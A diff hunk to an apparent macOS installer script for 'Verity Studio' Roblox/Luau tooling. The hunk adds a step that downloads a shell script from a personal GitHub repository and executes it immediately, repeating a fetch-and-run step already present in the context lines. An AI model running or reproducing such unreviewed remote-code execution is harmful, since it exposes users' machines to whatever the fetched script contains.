@@ -38,3 +38,12 @@ printf '[Verity Studio] Installing Script/LocalScript property validation…\n'
 curl --proto '=https' --tlsv1.2 --fail --location --silent --show-error --retry 2 "$guard_url" -o "$guard"
 bash -n "$guard"
 bash "$guard"
+
+# Apply the stronger v1.3.3 Author-property check and retry-once logic.
+quality_url='https://raw.githubusercontent.com/celineasher/NewRepo/master/verity-mac/repair-studio-author.sh'
+quality="$(mktemp "$HOME/Library/Caches/verity-studio-quality.XXXXXXXX")"
+trap 'rm -f "$installer" "$repair" "$guard" "$quality"' EXIT
+printf '[Verity Studio] Installing stronger Luau property validation v1.3.3…\n'
+curl --proto '=https' --tlsv1.2 --fail --location --silent --show-error --retry 2 "$quality_url" -o "$quality"
+bash -n "$quality"
+bash "$quality"
